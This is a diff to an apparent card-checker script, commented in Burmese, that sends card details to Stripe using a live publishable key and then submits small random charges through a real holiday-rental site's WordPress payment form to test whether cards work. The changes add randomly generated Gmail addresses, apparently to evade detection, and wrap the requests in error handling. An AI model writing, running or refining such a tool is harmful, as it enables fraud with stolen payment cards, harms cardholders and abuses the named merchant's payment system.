@@ -1,5 +1,6 @@
 import requests, re
 import random
+import string # Random စာသားတွေထုတ်ဖို့ ဒါလေးထပ်ထည့်ထားတယ်
 
 def Tele(ccx):
     ccx = ccx.strip()
@@ -15,6 +16,13 @@ def Tele(ccx):
 
     random_amount1 = random.randint(1, 4)
     random_amount2 = random.randint(1, 99)
+
+    # 🔥 Random Email Logic (ဒီမှာစပြီး ပြင်ထားတယ်) 🔥
+    # စာလုံး ၁၀ လုံးပါတဲ့ Random နာမည်တစ်ခု ဖန်တီးမယ်
+    letters = string.ascii_lowercase + string.digits
+    random_name = ''.join(random.choice(letters) for i in range(10))
+    random_email = f"{random_name}@gmail.com"
+    # ==========================================
 
     headers = {
         'authority': 'api.stripe.com',
@@ -40,13 +48,15 @@ def Tele(ccx):
         f'&key=pk_live_51QhDDVHWPpZcisLuMwjv1ViU8uCO57CpVHEkbM1kqmtEjJeIqjpaWdkV1v1aJIZzTsfQrSwP87AbhnkJLjXzF3yS00YCnP2Wym'
     )
 
-    response = requests.post(
-        'https://api.stripe.com/v1/payment_methods',
-        headers=headers,
-        data=data
-    )
-
-    pm = response.json()['id']
+    try:
+        response = requests.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=headers,
+            data=data
+        )
+        pm = response.json()['id']
+    except Exception as e:
+        return f"Error Creating PM: {e}"
 
     headers = {
         'authority': 'www.benidormholidays.com',
@@ -71,16 +81,20 @@ def Tele(ccx):
         'wpfs-form-get-parameters': '%7B%7D',
         'wpfs-custom-amount-unique': '5',
         'wpfs-custom-input[]': 'Super ',
-        'wpfs-card-holder-email': 't.r.u.on.g.h.i.en.ma.i23.85@gmail.com',
+        # 🔥 ဒီနေရာမှာ Random Email ကို ထည့်လိုက်ပြီ 🔥
+        'wpfs-card-holder-email': random_email,
         'wpfs-card-holder-name': 'Super Z',
         'wpfs-stripe-payment-method-id': f'{pm}',
     }
 
-    response = requests.post(
-        'https://www.benidormholidays.com/wp-admin/admin-ajax.php',
-        headers=headers,
-        data=data
-    )
-
-    result = response.json()['message']
+    try:
+        response = requests.post(
+            'https://www.benidormholidays.com/wp-admin/admin-ajax.php',
+            headers=headers,
+            data=data
+        )
+        result = response.json()['message']
+    except:
+        result = "Error capturing response"
+        
     return result
